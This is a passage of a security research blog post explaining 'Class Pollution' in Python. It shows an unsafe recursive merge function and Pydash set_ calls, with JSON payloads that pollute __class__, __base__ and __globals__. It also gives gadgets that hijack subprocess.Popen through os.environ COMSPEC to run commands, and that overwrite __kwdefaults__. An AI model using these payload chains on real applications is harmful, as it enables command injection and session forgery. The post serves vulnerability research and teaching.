emp.name = 'Employee 1' # Defining an attribute for an object (overriding the class attribute)
print(emp.name)

emp.say_hi = lambda: 'Hi there!' # Defining a method for an object
print(emp.say_hi())

Employee.say_bye = lambda s: 'Bye!' # Defining a method for the Employee class
print(emp.say_bye())

Employee.say_bye = lambda s: 'Bye bye!' # Overwriting a method of the Employee class
print(another_emp.say_bye())

#> No one
#> Employee 1
#> Hi there!
#> Bye!
#> Bye bye!</pre>



<p>In the code shown above, we created an instance of <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class, which is an empty class, and then defined a new attribute and method for that object. Attributes and methods can be defined on a specific object to be accessible by that instance only (non-static) or defined on a class so that all objects of that class can access it (static).</p>



<p>This feature in Python got me wondering why we can&#8217;t apply the same concept of Prototype Pollution but this time in Python by leveraging the special <strong>attributes</strong> that all objects have.<br>From an attacker&#8217;s perspective, we are interested more in attributes that we can override/overwrite to be able to exploit this vulnerability rather than the magic methods. As our input will always be treated as data (str, int, etc..) and not actual code to be evaluated. Therefore, if we try to overwrite any of the magic methods, it will lead to crashing the application when trying to invoke that method, as data such as strings can&#8217;t be executed. For example, trying to call <code data-enlighter-language="generic" class="EnlighterJSRAW">__str__()</code> method after setting its value to a string would throw an error like this <code data-enlighter-language="generic" class="EnlighterJSRAW">TypeError: 'str' object is not callable</code>.</p>



<p>Now let&#8217;s try to overwrite one of the most important attributes of any object in Python, which is <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code>, the attribute points to the class that the object is an instance of.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class

emp = Employee()
emp.__class__ = 'Polluted'

#> Traceback (most recent call last):
#>   File "&lt;stdin>", line 1, in &lt;module>
#> TypeError: __class__ must be set to a class, not 'str' object</pre>



<p>In our example, <code data-enlighter-language="generic" class="EnlighterJSRAW">emp.__class__</code> points to <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class because it&#8217;s an instance of that class. You can think about <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;instance&gt;.__class__</code> in Python as <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;instance&gt;.constructor</code> in JavaScript.</p>



<p>Even though we got an error when trying to set the <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code> attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">emp</code> object to a string, the error looks promising! It shows that <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code> must be set to another class and not a string. This means that it was trying to overwrite that special attribute with what we provided, the only issue is the datatype of the value we are trying to set <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code> to.</p>



<p>Let&#8217;s try to set another attribute that accepts strings, <code data-enlighter-language="generic" class="EnlighterJSRAW">__qualname__</code> attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code> might be good for testing. <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__.__qualname__</code> is an attribute that contains the class name.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class

emp = Employee()
emp.__class__.__qualname__ = 'Polluted'

print(emp)
print(Employee)

#> &lt;__main__.Polluted object at 0x0000024765C48250>
#> &lt;class '__main__.Polluted'></pre>



<p>We were able to pollute the class and set <code data-enlighter-language="generic" class="EnlighterJSRAW">__qualname__</code> attribute to an arbitrary string. Keep in mind that when we set <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__.__qualname__</code> on an object of a class, <code data-enlighter-language="generic" class="EnlighterJSRAW">__qualname__</code> attribute of that class (which is <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> in our case) has been changed, this is because <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code> is a reference to the class of that object and any modification on it will actually be applied to the class.</p>



<p>To see how the vulnerability might exist in real Python applications, I&#8217;ve ported the recursive merge function that&#8217;s being abused to pollute objects&#8217; prototype in the normal Prototype Pollution that we know.<br>The recursive merge function can exist in various ways and implementations and might be used to accomplish different tasks, such as merging two or more objects, using JSON to set an object&#8217;s attributes, etc. The key functionality to look for is a function that gets untrusted input that we control and use it to set attributes of an object recursively. Finding such a function would be enough for exploiting the vulnerability, however, If we were lucky enough to find a merge function that not only allows us to recursively traverse and set attributes (<code data-enlighter-language="generic" class="EnlighterJSRAW">__getattr__</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">__setattr__</code>) of an object but also allows us to recursively traverse and set items (<code data-enlighter-language="generic" class="EnlighterJSRAW">__getitem__</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">__setitem__</code>), this makes it easier to find gadgets to leverage. <br>On the other hand, a merge function that uses the input we control to recursively set <strong>items </strong>of a <strong>dictionary </strong>via <code data-enlighter-language="generic" class="EnlighterJSRAW">__getitem__</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">__setitem__</code> only, usually may not be exploitable, as we won&#8217;t be able to access special attributes such <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__</code>, etc.<br>In JavaScript, this may not be noticed because an object is just a dictionary in JS, <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;object&gt;[&lt;property&gt;]</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;object&gt;.&lt;property&gt;</code> can be used to access an object&#8217;s properties.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)

emp_info = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
        }
    }

emp = Employee()
print(vars(emp))

merge(emp_info, emp)

print(vars(emp))
print(f'Name: {emp.name}, age: {emp.age}, manager name: {emp.manager.get("name")}')

#> {}
#> {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
#> Name: Ahemd, age: 23, manager name: Sarah</pre>



<p>In the code above, we have a merge function that takes an instance <code data-enlighter-language="generic" class="EnlighterJSRAW">emp</code> of the empty <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class and employee&#8217;s info <code data-enlighter-language="generic" class="EnlighterJSRAW">emp_info</code> which is a dictionary (similar to JSON) that we control as an attacker. The merge function will read keys and values from the <code data-enlighter-language="generic" class="EnlighterJSRAW">emp_info</code> dictionary and set them on the given object <code data-enlighter-language="generic" class="EnlighterJSRAW">emp</code>. In the end, what was previously an empty instance should have the attributes and items that we gave in the dictionary.</p>



<p>Let&#8217;s try to overwrite some special attributes now! We will be updating <code data-enlighter-language="generic" class="EnlighterJSRAW">emp_info</code> to try to set <code data-enlighter-language="generic" class="EnlighterJSRAW">__qualname__</code> attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class via <code data-enlighter-language="generic" class="EnlighterJSRAW">emp.__class__.__qualname__</code> as we did before, but using the merge function this time.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)


emp_info = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
            "name":"Sarah"
        },
    "__class__":{
            "__qualname__":"Polluted"
        }
    }


emp = Employee()
merge(emp_info, emp)

print(vars(emp))
print(emp)
print(emp.__class__.__qualname__)

print(Employee)
print(Employee.__qualname__)

#> {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
#> &lt;__main__.Polluted object at 0x000001F80B20F5D0>
#> Polluted

#> &lt;class '__main__.Polluted'>
#> Polluted</pre>



<p>We were able to pollute the <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class, because an instance of that class is passed to the merge function, but what if we want to pollute the parent class as well? This is when <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__</code> comes into play, <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__</code> is another attribute of a class that points to the nearest parent class that it&#8217;s inheriting from, so if there is an inheritance chain, <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__</code> will point to the last class that we inherit.</p>



<p>In the example shown below, <code data-enlighter-language="generic" class="EnlighterJSRAW">hr_emp.__class__</code> points to the <code data-enlighter-language="generic" class="EnlighterJSRAW">HR</code> class, while <code data-enlighter-language="generic" class="EnlighterJSRAW">hr_emp.__class__.__base__</code> points to the parent class of <code data-enlighter-language="generic" class="EnlighterJSRAW">HR</code> class which is <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> which we will be polluting.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)


emp_info = {
    "__class__":{
        "__base__":{
            "__qualname__":"Polluted"
            }
        }
    }


hr_emp = HR()
merge(emp_info, hr_emp)

print(HR)
print(Employee)

#> &lt;class '__main__.HR'>
#> &lt;class '__main__.Polluted'></pre>



<p>The same approach can be followed if we want to pollute any parent class (that isn&#8217;t one of the immutable types) in the inheritance chain, by chaining  <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__</code> together such as <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__.__base__</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">__base__.__base__.__base__</code> and so on. </p>



<p>Now you might be wondering why don&#8217;t we pollute the well-known <code data-enlighter-language="generic" class="EnlighterJSRAW">object</code> class, that is the parent class of all classes at the end of the inheritance chain, and modifying any of its attributes would be reflected on all other objects.<br>If we tried to set an attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">object</code> class such as <code data-enlighter-language="generic" class="EnlighterJSRAW">object.__qualname__ = 'Polluted'</code> for example, we will get an error message <code data-enlighter-language="generic" class="EnlighterJSRAW">TypeError: cannot set '__qualname__' attribute of immutable type 'object'</code>.<br>This is due to some limitations that Python has, as it doesn&#8217;t allow us to modify classes of immutable types, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">object</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">str</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">int</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">dict</code>, etc.<br>With this limitation that we have, in order to exploit Class Pollution in Python, the unsafe merge and the attribute that we want to set in order to leverage a gadget must be in the same class or at least share the same parent class (other than the <code data-enlighter-language="generic" class="EnlighterJSRAW">object</code> class) at any point in the inheritance chain (not really, wait for it).</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from os import popen

class Employee: pass # Creating an empty class

class HR(Employee): pass # Class inherits from Employee class

class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)


emp_info = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
merge(emp_info, recruiter_emp)
print(system_admin_emp.execute_command())

#> [!] Executing: "echo Hello there", output: "Hello there"
#> [!] Executing: "whoami", output: "abdulrah33m"</pre>



<p>In the previous example, even though the unsafe merge happens on an object of <code data-enlighter-language="generic" class="EnlighterJSRAW">Recruiter</code> class and the gadget or the function that we are interested in (<code data-enlighter-language="generic" class="EnlighterJSRAW">execute_command</code> function that allows command execution) is in <code data-enlighter-language="generic" class="EnlighterJSRAW">SystemAdmin</code> class, we were able to take control of it by setting the <code data-enlighter-language="generic" class="EnlighterJSRAW">custom_command</code> attribute <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class.<br>This is doable because <code data-enlighter-language="generic" class="EnlighterJSRAW">SystemAdmin</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">Recruiter</code> inherit from <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class at some point. By leveraging the unsafe merge we were able to set <code data-enlighter-language="generic" class="EnlighterJSRAW">custom_command</code>  attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class, so that when an instance of <code data-enlighter-language="generic" class="EnlighterJSRAW">SystemAdmin</code> class looks for that attribute it will find it, as it&#8217;s inherited from the parent class <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code>.<br>It doesn&#8217;t matter whether the instance of <code data-enlighter-language="generic" class="EnlighterJSRAW">Recruiter</code> class was created before or after the merge operation since we&#8217;re polluting the class itself, which will be reflected on the existing instance and new instances of that class as well. It&#8217;s only that the gadget must be invoked after polluting the class.</p>



<p>That&#8217;s interesting but hold up, there is even more. Till now we were able to pollute attributes of the instance passed to the merge function and its mutable parent classes only, but this is not everything.<br>In this variation of Prototype Pollution, we may not be able to pollute the built-in object class but we can pollute all other mutable classes that we want if we can find a chain of attributes that leads to that class. Not only this, in fact, we&#8217;re not limited to classes and their attributes, by leveraging <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> attribute we can overwrite even variables in the code.<br>Based on Python <a href="https://docs.python.org/3/reference/datamodel.html" target="_blank" rel="noopener" title="">documentation</a> <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> is &#8220;A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined.&#8221; In other words, <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> is a dictionary object that gives us access to the global scope of a function which allows us to access defined variables, imported modules, etc. To access items of <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> attribute the merge function must be using <code data-enlighter-language="generic" class="EnlighterJSRAW">__getitem__</code> as previously mentioned.<br><code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> attribute is accessible from any of the <strong>defined </strong>methods of the instance we control, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">__init__</code>. We don&#8217;t have to use <code data-enlighter-language="generic" class="EnlighterJSRAW">__init__</code> in specific, we can use any defined method of that instance to access <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code>, however, most probably we will find  <code data-enlighter-language="generic" class="EnlighterJSRAW">__init__</code> method on every class since this is the class constructor. We cannot use built-in methods inherited from the <code data-enlighter-language="generic" class="EnlighterJSRAW">object</code> class, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">__str__</code> unless they were overridden. Keep in mind that <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;instance&gt;.__init__</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;instance&gt;.__class__.__init__</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">&lt;class&gt;.__init__</code> are all the same and point to the same class constructor.<br>So the rule of thumb here is that if we were able to find a chain of attributes/items (based on the merge function) from the object that we control to any attribute or a variable that we want to control, then we will be able to overwrite it. <br>This gives us much more flexibility and exponentially increases the attack surface when looking for gadgets to leverage. We will be showing some examples of gadgets that you may leverage based on the application.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)

class User:
	def __init__(self):
		pass

class NotAccessibleClass: pass
not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable)
print(NotAccessibleClass)

#> Polluted variable
#> &lt;class '__main__.PollutedClass'></pre>



<p>We leveraged the special attribute <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> to access and set an attribute of <code data-enlighter-language="generic" class="EnlighterJSRAW">NotAccessibleClass</code> class, and modify the global variable <code data-enlighter-language="generic" class="EnlighterJSRAW">not_accessible_variable</code>. <code data-enlighter-language="generic" class="EnlighterJSRAW">NotAccessibleClass</code>  and <code data-enlighter-language="generic" class="EnlighterJSRAW">not_accessible_variable</code> wouldn&#8217;t be accessible without <code data-enlighter-language="raw" class="EnlighterJSRAW">__globals__</code> since the class isn&#8217;t a parent class of the instance we control and the variable isn&#8217;t an attribute of the class we control. However, since we can find a chain of attributes/items to access it from the instance we have, we were able to pollute <code data-enlighter-language="generic" class="EnlighterJSRAW">NotAccessibleClass</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">not_accessible_variable</code>.</p>



<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> Real Examples of the Merge Function</h2>



<p>Let&#8217;s look for actual examples of the merge function implementation. <br>While I was working on this topic, I wanted to show real cases for libraries or applications that are vulnerable to Class Pollution to prove the concept. So, I started by doing some random searches about Python libraries providing functionality where recursive merge might be needed and used. <br>Lodash is one of the JavaScript libraries where Prototype Pollution was previously discovered and reported more than once. Now allow me to introduce you to the Python implementation of Lodash which is Pydash. Pydash <code data-enlighter-language="generic" class="EnlighterJSRAW">set_</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">set_with</code> functions are examples of recursive merge functions that we can leverage to pollute attributes. <br>The best thing is that both set_ and set_with allow us to move between object&#8217;s attributes and items in dictionaries and setting them which is the best thing that we could ask for. By passing the object, the path of the attribute/item we want to set, and the value to be set to, each of these functions can be used to set the specified attribute or item on the given instance.</p>



<p>In all the previous examples, the Pydash <code data-enlighter-language="generic" class="EnlighterJSRAW">set_</code> and <code data-enlighter-language="generic" class="EnlighterJSRAW">set_with</code> functions can be used instead of the merge function that we have written and it will still be exploitable in the same way. The only difference is that Pydash functions use dot notation such as <code data-enlighter-language="generic" class="EnlighterJSRAW">((&lt;attribute&gt;|&lt;item&gt;).)*(&lt;attribute&gt;|&lt;item&gt;)</code> to access attributes and items instead of the JSON format.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import pydash

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass
not_accessible_variable = 'Hello'

pydash.set_(User(), '__class__.__init__.__globals__.not_accessible_variable','Polluted variable')
print(not_accessible_variable)

pydash.set_(User(), '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
print(NotAccessibleClass)

#> Polluted variable
#> &lt;class '__main__.PollutedClass'></pre>



<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> Some Cool Gadgets</h2>



<p>As always in Prototype Pollution, the impact depends on the application and the available gadgets to be leveraged, here also the impact ranges between causing DoS by crashing the application and ultimately achieving command execution, it all depends on the application itself.<br>While we can&#8217;t list all the gadgets that you may find, in this section I&#8217;ll try to show some of the cool gadgets that you might come across while exploiting this vulnerability.</p>



<h5 class="wp-block-heading">subprocess.Popen on Windows</h5>



<p>In this example, we can set any attribute or item under the newly created instance of <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> class, by providing the JSON formatted payload as previously shown. After performing the merge operation, the script executes the hard-coded <code data-enlighter-language="generic" class="EnlighterJSRAW">whoami</code> command. Our objective here is to hijack the execution of <code data-enlighter-language="generic" class="EnlighterJSRAW">Popen</code> to execute arbitrary commands instead of the <code data-enlighter-language="generic" class="EnlighterJSRAW">whoami</code> command.<br>Take some time and try to pop <code data-enlighter-language="generic" class="EnlighterJSRAW">calc.exe</code> on your own before you continue reading, this exploit works on Windows only.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import subprocess, json

class Employee:
	def __init__(self):
		pass

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)

emp_info = json.loads('{"name": "employee"}') # attacker-controlled value

merge(emp_info, Employee())

subprocess.Popen('whoami', shell=True)</pre>



<p>Our main objective here is to find a chain of attributes and items that somehow allows us to control the command executed by <code data-enlighter-language="generic" class="EnlighterJSRAW">Popen</code> (is class and not a function).<br>By looking into the <code data-enlighter-language="generic" class="EnlighterJSRAW">subprocess</code> module source code to see how <code data-enlighter-language="generic" class="EnlighterJSRAW">Popen</code> works on Windows. </p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="1481-1482" data-enlighter-linenumbers="" data-enlighter-lineoffset="1478" data-enlighter-title="" data-enlighter-group="">if shell:
    startupinfo.dwFlags |= _winapi.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = _winapi.SW_HIDE
    comspec = os.environ.get("COMSPEC", "cmd.exe")
    args = '{} /c "{}"'.format (comspec, args)</pre>



<p>We notice that there&#8217;s an if statement that checks if the <code data-enlighter-language="generic" class="EnlighterJSRAW">shell</code> argument was set to <code data-enlighter-language="generic" class="EnlighterJSRAW">True</code> or not, if it was set to <code data-enlighter-language="generic" class="EnlighterJSRAW">True</code>, it tries to get the path of <code data-enlighter-language="generic" class="EnlighterJSRAW">cmd.exe</code> from the user&#8217;s environment variables to execute the provided command using <code data-enlighter-language="generic" class="EnlighterJSRAW">C:\WINDOWS\system32\cmd.exe /c &lt;command&gt;</code>. If the environment variable <code data-enlighter-language="generic" class="EnlighterJSRAW">COMSPEC</code>  is not defined then it sets <code data-enlighter-language="generic" class="EnlighterJSRAW">comspec</code> variable in the code (not the environment variable) to <code data-enlighter-language="generic" class="EnlighterJSRAW">cmd.exe</code>. So if we control the value of <code data-enlighter-language="generic" class="EnlighterJSRAW">COMSPEC</code> in <code data-enlighter-language="generic" class="EnlighterJSRAW">os.environ</code>, we will be able to inject arbitrary commands.</p>



<p>The chain that we need to use to overwrite <code data-enlighter-language="generic" class="EnlighterJSRAW">COMSPEC</code> environment variable can be explained as follows:</p>



<ol class="wp-block-list">
<li>We will start by accessing any method of <code data-enlighter-language="generic" class="EnlighterJSRAW">Employee</code> instance other than the built-in methods to be able to access <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> attribute, which is <code data-enlighter-language="generic" class="EnlighterJSRAW">__init__</code> in our case.</li>



<li>Using <code data-enlighter-language="generic" class="EnlighterJSRAW">__globals__</code> we will be able to access the <code data-enlighter-language="generic" class="EnlighterJSRAW">subprocess</code> module that is imported in our script.</li>



<li>On the first lines of <code data-enlighter-language="generic" class="EnlighterJSRAW">subprocess</code> module, we can see that it imports the <code data-enlighter-language="generic" class="EnlighterJSRAW">os</code> module which we need to access to get to <code data-enlighter-language="generic" class="EnlighterJSRAW">environ</code>. If the <code data-enlighter-language="generic" class="EnlighterJSRAW">os</code> module was already imported in our script, we would be able to access it directly using <code data-enlighter-language="generic" class="EnlighterJSRAW">__init__.__globals__.os</code> without needing to use <code data-enlighter-language="generic" class="EnlighterJSRAW">subprocess</code>.</li>



<li>Finally, after getting to <code data-enlighter-language="generic" class="EnlighterJSRAW">os</code> module we can overwrite the value of <code data-enlighter-language="generic" class="EnlighterJSRAW">COMSPEC</code> inside <code data-enlighter-language="generic" class="EnlighterJSRAW">environ</code> to perform command injection.</li>
</ol>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import subprocess, json

class Employee:
	def __init__(self):
		pass

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)

emp_info = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(emp_info, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up</pre>



<h5 class="wp-block-heading">Overwriting Function&#8217;s __kwdefaults__ </h5>



<p><code data-enlighter-language="generic" class="EnlighterJSRAW">__kwdefaults__</code> is a special attribute of all functions, based on Python <a href="https://docs.python.org/3/library/inspect.html" target="_blank" rel="noreferrer noopener">documentation</a>, it is a &#8220;mapping of any default values for <strong>keyword-only</strong> parameters&#8221;. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function&#8217;s parameters that come after <code data-enlighter-language="generic" class="EnlighterJSRAW">*</code> or <code data-enlighter-language="generic" class="EnlighterJSRAW">*args</code>.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import json

def merge(src, dst):
    # Recursive merge function
	for k, v in src.items():
		if hasattr(dst, '__getitem__'):
			if dst.get(k) and type(v) == dict:
				merge(v, dst.get(k))
			else:
				dst[k] = v
		elif hasattr(dst, k) and type(v) == dict:
			merge(v, getattr(dst, k))
		else:
			setattr(dst, k, v)

class Employee:
	def __init__(self):
		pass

def print_message(*, message='Hello there'):
	print(message)

print(print_message.__kwdefaults__)
print_message()

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"print_message":{"__kwdefaults__":{"message":"Polluted default value"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(print_message.__kwdefaults__)
print_message()

#> {'message': 'Hello there'}
#> Hello there

#> {'message': 'Polluted default value'}
#> Polluted default value</pre>



<p>While <code data-enlighter-language="generic" class="EnlighterJSRAW">__kwdefaults__</code> stores default values for <strong>keyword-only</strong> parameters, <code data-enlighter-language="generic" class="EnlighterJSRAW">__defaults__</code> attribute is a tuple that stores default values for <strong>positional-or-keyword</strong> parameters. It would be great if we can pollute  <code data-enlighter-language="generic" class="EnlighterJSRAW">__defaults__</code> attribute of a function, however, this won&#8217;t be possible in scenarios where the untrusted input that we control is parsed as JSON because JSON format does not have tuples <code data-enlighter-language="generic" class="EnlighterJSRAW">()</code>.</p>



<h5 class="wp-block-heading">There is More</h5>



<p>Since it won&#8217;t be possible to list all the possible ways to leverage this vulnerability, I&#8217;ll mention a few more examples and leave it for the readers to explore them further.</p>



<ul class="wp-block-list">
<li>Overwriting Flask web app secret key that&#8217;s used for session signing.</li>



<li>Path hijacking via <code data-enlighter-language="generic" class="EnlighterJSRAW">os.environ</code>.</li>
</ul>



<h2 class="wp-block-heading" id="block-71347de8-9929-46ae-a725-49bbadf7675c"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> References</h2>



<ul class="wp-block-list">
<li><a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" target="_blank" rel="noopener" title="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications</a></li>



<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener" title="">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></li>



<li><a href="https://alistapart.com/article/prototypal-object-oriented-programming-using-javascript/" target="_blank" rel="noopener" title="">https://alistapart.com/article/prototypal-object-oriented-programming-using-javascript/</a></li>



